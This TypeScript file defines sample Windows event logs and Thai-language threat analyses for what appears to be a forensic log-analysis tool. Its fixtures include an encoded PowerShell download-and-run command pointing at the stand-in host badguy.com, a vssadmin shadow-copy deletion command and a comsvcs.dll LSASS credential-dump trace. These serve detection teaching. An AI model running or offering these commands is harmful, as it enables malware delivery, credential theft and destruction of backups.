import type { PresetItem } from '../types/forensic';

export const LOG_PRESETS: Record<string, PresetItem> = {
  rdp: {
    id: 'rdp',
    label: 'RDP Bypassed',
    fileName: 'security_rdp_brute.evtx',
    badge: 'Security (Event ID 4624)',
    tag: 'RDP Bypassed',
    binary: true,
    icon: 'fa-wifi',
    colorClass: 'text-blue-400',
    rawText: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{5484c225-bf70-450e-bc21-5a37e57c6b45}" />
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2026-07-13T14:22:15.102Z" />
    <Computer>WIN-SRV-AD01.corp.internal</Computer>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">185.220.101.40</Data>
    <Data Name="IpPort">58412</Data>
  </EventData>
</Event>`,
    analysis: {
      severity: 'HIGH RISK',
      score: 75,
      title: 'RDP Remote Administration Abuse / Brute-Force',
      mitre: ['T1021.001 - Remote Services: RDP', 'T1110 - Brute Force'],
      mitigation: `บล็อกหมายเลขไอพีประสงค์ร้ายทันทีในระบบ Firewall
ปรับปรุงรหัสผ่านของบัญชี Administrator ให้มีความซับซ้อนขึ้น
เปิดระบบ Multi-Factor Authentication (MFA)`,
      abstract: `ตรวจพบพฤติกรรมสุ่มเสี่ยงความเสถียรระดับสูงเนื่องจากมีการเชื่อมต่อระยะไกลผ่านระบบ RDP (Logon Type 10) โดยใช้บัญชีระดับสูงสุดอย่าง 'Administrator' จากหมายเลขไอพีต่างแดนที่ไม่สอดคล้องกับพฤติกรรมขององค์กรปกติ`,
      why: [
        {
          title: 'Logon Type 10 Detect',
          desc: 'การเกิด Logon Type 10 เป็นการระบุว่ามีการใช้ Remote Desktop ตรงๆ เข้าคอมพิวเตอร์เซิร์ฟเวอร์หลัก ซึ่งบัญชี Domain Admin ปกติไม่มีนโยบายการสืบพยานล็อกอินตรงจากนอกวงขอบเขต',
        },
        {
          title: 'Tor Network Exit Node Connection',
          desc: 'ตรวจพบไอพีผู้สแกน 185.220.101.40 เป็นหนึ่งในกลุ่มผู้รับส่งพร็อกซีพรางตัว Tor Exit Node ซึ่งแฮกเกอร์ใช้พรางร่องรอยการโจมตีดิจิทัล',
        },
      ],
    },
  },
  powershell: {
    id: 'powershell',
    label: 'PowerShell',
    fileName: 'sysmon_obfuscated.evtx',
    badge: 'Sysmon (Event ID 1)',
    tag: 'PowerShell',
    binary: true,
    icon: 'fa-terminal',
    colorClass: 'text-emerald-400',
    rawText: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-07-13T16:45:10.012Z" />
    <Computer>WIN-SRV-AD01.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -e aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkZ3V5LmNvbS9wYXlsb2FkLnBzMScp</Data>
    <Data Name="User">CORP\\LocalAdmin</Data>
  </EventData>
</Event>`,
    analysis: {
      severity: 'CRITICAL',
      score: 95,
      title: 'Malicious Obfuscated PowerShell Execution',
      mitre: ['T1059.001 - PowerShell', 'T1027 - Obfuscated Files'],
      mitigation: `ทำการตัดเครือข่ายอุปกรณ์เครื่องนี้เพื่อกักกันไวรัส
ตรวจสอบ Active Session ของผู้ใช้ LocalAdmin ทั้งหมดในระบบ Active Directory
ตรวจสอบและบล็อกทราฟฟิกเครือข่ายขาออกที่เชื่อมต่อไปยัง badguy.com`,
      abstract: `ตรวจพบพฤติกรรมการเรียกใช้งานชุดคำสั่ง PowerShell แบบมีเจตนาปิดบังสายตาผู้ดูแลความมั่นคงปลอดภัย โดยใช้วิธีซ่อนหน้าต่างและเข้ารหัสชุดคำสั่งฐานสิบหกหรือ Base64 อย่างจงใจ`,
      why: [
        {
          title: 'Encoded PowerShell (-e)',
          desc: 'การส่งอาร์กิวเมนต์ย่อประเภท -e (EncodedCommand) ชี้ว่ามีคอร์สคริปต์สแกนพยายามหลบตัวแอนตี้ไวรัสด้วยการเข้ารหัสข้อความคำสั่ง',
        },
        {
          title: 'Web Request Payload Download',
          desc: 'การรันสคริปต์มีการเปิดฟังก์ชัน DownloadString มุ่งหาเซิร์ฟเวอร์ระยะไกลข้างนอกเพื่อสตรีมมัลแวร์มาฝังตัวในหน่วยความจำชั่วคราว',
        },
      ],
    },
  },
  clear: {
    id: 'clear',
    label: 'Clear Logs',
    fileName: 'log_audit_cleared.xml',
    badge: 'Security (Event ID 1102)',
    tag: 'Clear Logs',
    binary: false,
    icon: 'fa-trash-can',
    colorClass: 'text-rose-400',
    rawText: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ee11-6310-4859-90d3-04148e65261d}" />
    <EventID>1102</EventID>
    <TimeCreated SystemTime="2026-07-13T21:10:00.000Z" />
    <Computer>WIN-SRV-AD01.corp.internal</Computer>
    <Channel>Security</Channel>
  </System>
  <UserData>
    <LogFileCleared>
      <SubjectUserName>LocalAdmin</SubjectUserName>
      <SubjectDomainName>CORP</SubjectDomainName>
    </LogFileCleared>
  </UserData>
</Event>`,
    analysis: {
      severity: 'CRITICAL',
      score: 90,
      title: 'Security Audit Logs Maliciously Cleared',
      mitre: ['T1070.001 - Clear Windows Event Logs'],
      mitigation: `เร่งดึงประวัติสำรอง (Log Backups) จากตัวรวมบันทึกส่วนกลาง (SIEM / Syslog Server)
กวาดล้างและตั้งค่าการตรวจสอบเซสชันสิทธิ์ของผู้ใช้งาน LocalAdmin ทันที`,
      abstract: `ตรวจพบลายนิ้วมือผู้บุกรุกที่มีการพยายามพรางพยานหลักฐานประวัติการโจมตีทั้งหมด โดยเข้าสั่งทำลายหรือล้างฐานล็อกพยากรณ์ความมั่นคงปลอดภัยบน Windows Security Event Log คลีนชีท`,
      why: [
        {
          title: 'Event ID 1102 Triggered',
          desc: 'เหตุการณ์ ID 1102 เป็นเครื่องชี้วัดยืนยันทางวิทยาศาสตร์คอมพิวเตอร์ว่ามีผู้สั่งล้างความทรงจำประวัติระบบปฏิบัติการ ไม่สามารถเกิดจากระบบปกติทำงาน',
        },
        {
          title: 'Defeating Security Controls',
          desc: 'การลบล็อกความมั่นคงเป็นขั้นตอนสุดท้ายของทีมจู่โจมไซเบอร์ (Post-Exploitation) เพื่อปิดตาพนักงานฝ่ายความมั่นคงปลอดภัย Blue Team',
        },
      ],
    },
  },
  ransomware: {
    id: 'ransomware',
    label: 'LockBit 3.0',
    fileName: 'sysmon_ransomware_vss.evtx',
    badge: 'Sysmon (Event ID 1)',
    tag: 'LockBit 3.0',
    binary: true,
    icon: 'fa-biohazard',
    colorClass: 'text-red-500',
    rawText: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-07-13T22:05:41.332Z" />
    <Computer>WIN-SRV-AD01.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\vssadmin.exe</Data>
    <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
    <Data Name="User">CORP\\Administrator</Data>
    <Data Name="ParentImage">C:\\Users\\Administrator\\Downloads\\lockbit3.exe</Data>
  </EventData>
</Event>`,
    analysis: {
      severity: 'CRITICAL',
      score: 99,
      title: 'Ransomware Inhibit System Recovery (VSS Shadow Copy Deletion)',
      mitre: ['T1490 - Inhibit System Recovery', 'T1486 - Data Encrypted for Impact'],
      mitigation: `ทำการ Isolate Host เครื่องเป้าหมายออกจากโครงสร้างหลักทันที
บล็อกพอร์ตการแชร์ไฟล์ SMB ทั่วทั้งโดเมนชั่วคราว
ตรวจสอบกระบวนการ lockbit3.exe ในเครื่องที่เกี่ยวข้องอย่างเข้มข้น`,
      abstract: `ตรวจพบพฤติกรรมการเรียกใช้งานยูทิลิตี้ 'vssadmin.exe' เพื่อลบล้างชุดข้อมูลสำรองเบื้องหลัง (Volume Shadow Copies) ของคอมพิวเตอร์อย่างเงียบๆ ซึ่งเป็นสัญญาณระดับสีแดงสูงสุดของการเตรียมเจาะเข้ารหัสลับข้อมูลโดยกลุ่ม Ransomware ก่อนเริ่มการทำลายล้าง`,
      why: [
        {
          title: 'Forced Shadow Copy Destruction',
          desc: 'การส่งคำสั่ง delete shadows /all /quiet เป็นพฤติกรรมเฉพาะตัวของแรมซัมแวร์ เพื่อทำลายจุดคืนสภาพระบบ (Restore Points) ไม่ให้แอดมินหรือเหยื่อทำการกู้คืนข้อมูลได้',
        },
        {
          title: 'Untrusted Process Parent',
          desc: 'โปรเซสพ่อที่ทำงานคือ lockbit3.exe ซึ่งดาวน์โหลดมาจากอินเทอร์เน็ต ชี้ชัดว่าเป็นความเสี่ยงร้ายแรงในการเตรียมยึดโครงสร้างสถาปัตยกรรมสารสนเทศ',
        },
      ],
    },
  },
  lsass: {
    id: 'lsass',
    label: 'Dump LSASS',
    fileName: 'sysmon_lsass_dump.evtx',
    badge: 'Sysmon (Event ID 10)',
    tag: 'Dump LSASS',
    binary: true,
    icon: 'fa-key',
    colorClass: 'text-purple-400',
    rawText: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>10</EventID>
    <TimeCreated SystemTime="2026-07-13T23:18:02.112Z" />
    <Computer>WIN-SRV-AD01.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="SourceImage">C:\\Windows\\System32\\rundll32.exe</Data>
    <Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1F10DD</Data>
    <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+0xa5103|C:\\Windows\\System32\\comsvcs.dll+0x2411b</Data>
  </EventData>
</Event>`,
    analysis: {
      severity: 'CRITICAL',
      score: 98,
      title: 'Credential Dumping via LSASS Memory Extraction',
      mitre: ['T1003.001 - LSASS Memory Dumping'],
      mitigation: `เพิกถอนเซสชันโทเค็นของบัญชีแอดมินทั้งหมดในระบบ Active Directory
เปลี่ยนรหัสผ่านระดับ Domain Admin ทั้งหมดเพื่อความมั่นคงปลอดภัย
เปิดทำงานระบบป้องกัน Windows LSA Protection (RunAsPPL)`,
      abstract: `ตรวจพบโปรเซสภายนอก (rundll32.exe) พยายามร้องขอสิทธิ์เข้าถึงพิกัดสูงสุด (GrantedAccess: 0x1F10DD) ของหน่วยความจำ LSASS.exe ผ่านไลบรารี comsvcs.dll เพื่อคัดลอกไฟล์หน่วยความจำไปดึงรหัสผ่านในภายหลัง`,
      why: [
        {
          title: 'PROCESS_ALL_ACCESS Request',
          desc: 'รหัส 0x1F10DD เป็นสิทธิ์ควบคุมลึกที่สุดของ LSASS.exe ซึ่งโปรแกรมปกติภายนอกไม่มีสิทธิ์และเจตนาที่จะเรียกร้อง นอกจากโปรแกรมเจาะระบบจำพวก Mimikatz',
        },
        {
          title: 'Abuse of comsvcs.dll',
          desc: 'การใช้ Rundll32 เรียกดีแอลแอลตัวกลางในระบบ comsvcs.dll ชี้ว่าแฮกเกอร์กำลังเขียนไฟล์ดัมพ์รหัสผ่านเครื่อง (Lsass Minidump) ไปพักไว้ที่โฟลเดอร์ชั่วคราวเพื่อนำไปถอดเป็นรหัสผ่านดิบ',
        },
      ],
    },
  },
};
